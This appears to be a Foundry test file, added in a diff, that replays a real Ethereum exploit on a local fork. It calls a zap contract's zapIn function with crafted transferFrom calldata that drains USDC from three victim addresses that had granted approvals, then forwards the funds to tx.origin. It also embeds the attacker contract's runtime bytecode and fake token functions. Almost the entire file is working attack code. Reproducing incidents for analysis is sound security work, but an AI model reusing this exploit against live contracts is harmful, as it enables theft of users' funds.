@@ -1,0 +1,204 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+
+interface IERC20 {
+    function balanceOf(address) external view returns (uint256);
+}
+
+// https://explorer.phalcon.xyz/tx/eth/0xeaef2831d4d6bca04e4e9035613be637ae3b0034977673c1c2f10903926f29c0
+// https://etherscan.io/address/0x6FA00a7324DC293eA8ECf56fe3143104494C4213
+
+struct S1 {
+    address p1;
+    address p2;
+    uint24 p3;
+    address p4;
+    uint256 p5;
+    uint256 p6;
+    uint160 p7;
+}
+
+struct S2 {
+    address p1;
+    uint256 p2;
+    uint256 p3;
+    address p4;
+    address p5;
+    bytes p6;
+}
+
+interface I {
+    function exactInputSingle(S1 memory) external payable;
+    function transfer(address, uint256) external payable;
+    function balanceOf(address) external payable returns (uint256);
+    function zapIn(S2 memory) external payable;
+    function deposit() external payable;
+    function approve(address, uint256) external payable;
+}
+
+contract X6003 is Test {
+    address immutable r = address(this);
+    receive() external payable {}
+
+    function setUp() public pure {
+        console2.log("0xeaef2831d4d6bca04e4e9035613be637ae3b0034977673c1c2f10903926f29c0");
+    }
+
+    address constant x1407 = 0x140713bbD82113e104C3a45661134F9764807922;
+    address constant x3924 = 0x392472C4369d6CDEA89e2bDDfd8144EEcfdC032C;
+    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
+    address constant x68b3 = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;
+    address constant x853d = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
+    address constant xa0b8 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+    address constant xa197 = 0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3;
+    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address constant xd248 = 0xD248B30A3207A766d318C7A87F5Cf334A439446D;
+
+    function test1() public {
+        vm.createSelectFork("http://localhost:18545", 15933794); // tx.blockNumber - 1
+        // vm.createSelectFork("http://localhost:18545", bytes32(0xacf7f9bdb9fb13ed36b2b265e796e39adc5b47510af259a73c949c38a617b5d9));
+
+        // https://explorer.phalcon.xyz/tx/eth/0xacf7f9bdb9fb13ed36b2b265e796e39adc5b47510af259a73c949c38a617b5d9
+        this.xacf7f9bd();
+        // https://explorer.phalcon.xyz/tx/eth/0xeaef2831d4d6bca04e4e9035613be637ae3b0034977673c1c2f10903926f29c0
+        xdde1ee37();
+    }
+
+    function test2() public {
+        vm.createSelectFork("http://localhost:18545", 15933776); // tx.blockNumber - 1
+        // https://explorer.phalcon.xyz/tx/eth/0xacf7f9bdb9fb13ed36b2b265e796e39adc5b47510af259a73c949c38a617b5d9
+        this.xacf7f9bd();
+        vm.warp(1668012947);
+        vm.roll(15933794);
+        // https://explorer.phalcon.xyz/tx/eth/0xeaef2831d4d6bca04e4e9035613be637ae3b0034977673c1c2f10903926f29c0
+        xdde1ee37();
+    }
+
+    function test3() public {
+        vm.createSelectFork("http://localhost:18545", 15933794); // tx.blockNumber - 1
+
+        address RECEIVER = address(this);
+        vm.warp(1668012947);
+        vm.roll(15933795);
+        // https://explorer.phalcon.xyz/tx/eth/0xeaef2831d4d6bca04e4e9035613be637ae3b0034977673c1c2f10903926f29c0
+        vm.deal(RECEIVER, 10 ether);
+        {
+            address token = address(0x853d955aCEf822Db058eb8505911ED77F175b99e);
+            uint256 target = 1000000000000000000000000;
+            uint256 snap = vm.snapshotState();
+            bool found = false;
+            uint256 foundSlot = type(uint256).max;
+            for (uint256 slot = 0; slot < 100; slot++) {
+                vm.revertToState(snap);
+                vm.store(token, keccak256(abi.encode(RECEIVER, uint256(slot))), bytes32(uint256(target)));
+                uint256 bal = IERC20(token).balanceOf(RECEIVER);
+                if (bal != target) continue;
+                found = true;
+                foundSlot = slot;
+                break;
+            }
+            if (!found) {
+                vm.revertToState(snap);
+            } else {
+                emit log_named_address("GF_SLOT_CACHE_TOKEN", token);
+                emit log_named_uint("GF_SLOT_CACHE_SLOT", foundSlot);
+                emit log_named_uint("GF_SLOT_CACHE_IS_VYPER", 0);
+                vm.revertToState(snap);
+                vm.store(token, keccak256(abi.encode(RECEIVER, uint256(foundSlot))), bytes32(uint256(target)));
+                require(IERC20(token).balanceOf(RECEIVER) == target, "GF: final store failed");
+            }
+        }
+        vm.store(
+            address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48),
+            keccak256(abi.encode(RECEIVER, uint256(9))),
+            bytes32(uint256(1000000000000000000000000))
+        );
+        vm.store(
+            address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2),
+            keccak256(abi.encode(RECEIVER, uint256(3))),
+            bytes32(uint256(1000000000000000000000000))
+        );
+        xdde1ee37();
+    }
+
+    function xacf7f9bd() public {
+        this._constructor_{value: 100000000000000}();
+    }
+
+    function xdde1ee37() public {
+        // uint256 v1 = 5364965317;
+        uint256 v1 = I(xa0b8).balanceOf(x3924);
+        console2.log("I(xa0b8).balanceOf(x3924)\t->", uint256(5364965317));
+
+        bytes memory b03 =
+            hex"23b872dd000000000000000000000000392472c4369d6cdea89e2bddfd8144eecfdc032c00000000000000000000000060032a41726241499b0c626c836c9099cb895c05000000000000000000000000000000000000000000000000000000013fc6dfc5";
+        S2 memory s201 = S2(r, 1, 0, r, xa0b8, b03);
+        I(xd248).zapIn(s201);
+
+        // uint256 v2 = 4299130227;
+        uint256 v2 = I(xa0b8).balanceOf(x1407);
+        console2.log("I(xa0b8).balanceOf(x1407)\t->", uint256(4299130227));
+
+        bytes memory b04 =
+            hex"23b872dd000000000000000000000000140713bbd82113e104c3a45661134f976480792200000000000000000000000060032a41726241499b0c626c836c9099cb895c0500000000000000000000000000000000000000000000000000000001003f8573";
+        S2 memory s202 = S2(r, 1, 0, r, xa0b8, b04);
+        I(xd248).zapIn(s202);
+
+        // uint256 v3 = 79679661825;
+        uint256 v3 = I(xa0b8).balanceOf(xa197);
+        console2.log("I(xa0b8).balanceOf(xa197)\t->", uint256(79679661825));
+
+        bytes memory b05 =
+            hex"23b872dd000000000000000000000000a19789f57d0e0225a82eeff0fecb9f3776f276a300000000000000000000000060032a41726241499b0c626c836c9099cb895c05000000000000000000000000000000000000000000000000000000128d472701";
+        S2 memory s203 = S2(r, 1, 0, r, xa0b8, b05);
+        I(xd248).zapIn(s203);
+
+        // uint256 v4 = 89343757369;
+        uint256 v4 = I(xa0b8).balanceOf(r);
+        console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(89343757369));
+        I(xa0b8).transfer(tx.origin, v4);
+    }
+
+    function balanceOf(address) public returns (uint256) {
+        return 1;
+    }
+
+    function approve(address, uint256) public {
+        I(x853d).transfer(xd248, 10);
+
+        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
+        assembly {
+            return(add(rt, 0x20), mload(rt))
+        }
+    }
+
+    function transferFrom(address, address, uint256) public {
+        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
+        assembly {
+            return(add(rt, 0x20), mload(rt))
+        }
+    }
+
+    function _constructor_() public payable {
+        I(xc02a).deposit{value: 100000000000000}();
+        I(xc02a).approve(x68b3, type(uint256).max);
+        // uint256 v1 = 100000000000000;
+        uint256 v1 = I(xc02a).balanceOf(r);
+        console2.log("I(xc02a).balanceOf(r)\t\t->", uint256(100000000000000));
+
+        S1 memory s101 = S1(xc02a, x853d, 3000, r, 100000000000000, 0, 0);
+        I(x68b3).exactInputSingle(s101);
+
+        bytes memory rt =
+            hex"60806040526004361061003f5760003560e01c8063095ea7b31461006157806323b872dd1461009657806370a08231146100b6578063dde1ee37146100e4575b32736fa00a7324dc293ea8ecf56fe3143104494c42131461005f57600080fd5b005b34801561006d57600080fd5b5061008161007c3660046106d4565b6100f7565b60405190151581526020015b60405180910390f35b3480156100a257600080fd5b506100816100b13660046106fe565b6101d2565b3480156100c257600080fd5b506100d66100d136600461073a565b6101f4565b60405190815260200161008d565b61005f6100f236600461075c565b61021e565b600032736fa00a7324dc293ea8ecf56fe3143104494c42131461011957600080fd5b6000546040517fa9059cbb00000000000000000000000000000000000000000000000000000000815273ffffffffffffffffffffffffffffffffffffffff9091166004820152600a602482015273853d955acef822db058eb8505911ed77f175b99e9063a9059cbb906044016020604051808303816000875af11580156101a4573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101c891906107e0565b5060019392505050565b600032736fa00a7324dc293ea8ecf56fe3143104494c4213146101c857600080fd5b600032736fa00a7324dc293ea8ecf56fe3143104494c42131461021657600080fd5b506001919050565b33736fa00a7324dc293ea8ecf56fe3143104494c42131461023e57600080fd5b600080547fffffffffffffffffffffffff00000000000000000000000000000000000000001673ffffffffffffffffffffffffffffffffffffffff831617815530906001908273a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48825b878110156105395760007f23b872dd000000000000000000000000000000000000000000000000000000008a8a848181106102d8576102d8610802565b90506020020160208101906102ed919061073a565b3073a0b86991c6218b36c1d19d4a2e9eb0ce3606eb486370a082318e8e8881811061031a5761031a610802565b905060200201602081019061032f919061073a565b6040517fffffffff0000000000000000000000000000000000000000000000000000000060e084901b16815273ffffffffffffffffffffffffffffffffffffffff9091166004820152602401602060405180830381865afa158015610398573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103bc9190610831565b60405173ffffffffffffffffffffffffffffffffffffffff93841660248201529290911660448301526064820152608401604080517fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0818403018152918152602080830180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff167fffffffff0000000000000000000000000000000000000000000000000000000090951694909417909352805160c08101825273ffffffffffffffffffffffffffffffffffffffff808c1682529381018a90528082018990528784166060820152868416608082015260a0810183905260005491517f31daf7fe0000000000000000000000000000000000000000000000000000000081529294509216906331daf7fe906104f290849060040161084a565b600060405180830381600087803b15801561050c57600080fd5b505af1158015610520573d6000803e3d6000fd5b505050505050808061053190610910565b91505061029b565b506040517f70a0823100000000000000000000000000000000000000000000000000000000815230600482015273a0b86991c6218b36c1d19d4a2e9eb0ce3606eb489063a9059cbb90736fa00a7324dc293ea8ecf56fe3143104494c42139083906370a0823190602401602060405180830381865afa1580156105c0573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105e49190610831565b6040517fffffffff0000000000000000000000000000000000000000000000000000000060e085901b16815273ffffffffffffffffffffffffffffffffffffffff909216600483015260248201526044016020604051808303816000875af1158015610654573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061067891906107e0565b5050600080547fffffffffffffffffffffffff000000000000000000000000000000000000000016905550505050505050565b803573ffffffffffffffffffffffffffffffffffffffff811681146106cf57600080fd5b919050565b600080604083850312156106e757600080fd5b6106f0836106ab565b946020939093013593505050565b60008060006060848603121561071357600080fd5b61071c846106ab565b925061072a602085016106ab565b9150604084013590509250925092565b60006020828403121561074c57600080fd5b610755826106ab565b9392505050565b60008060006040848603121561077157600080fd5b833567ffffffffffffffff8082111561078957600080fd5b818601915086601f83011261079d57600080fd5b8135818111156107ac57600080fd5b8760208260051b85010111156107c157600080fd5b6020928301955093506107d791860190506106ab565b90509250925092565b6000602082840312156107f257600080fd5b8151801515811461075557600080fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60006020828403121561084357600080fd5b5051919050565b6000602080835273ffffffffffffffffffffffffffffffffffffffff8085511682850152818501516040850152604085015160608501528060608601511660808501528060808601511660a08501525060a084015160c08085015280518060e086015260005b818110156108cd57828101840151868201610100015283016108b0565b5061010092506000838287010152827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0601f830116860101935050505092915050565b60007fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8203610968577f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b506001019056fea164736f6c6343000811000a";
+        assembly {
+            return(add(rt, 0x20), mload(rt))
+        }
+    }
+
+    fallback() external payable {
+        revert("no such function");
+    }
+}
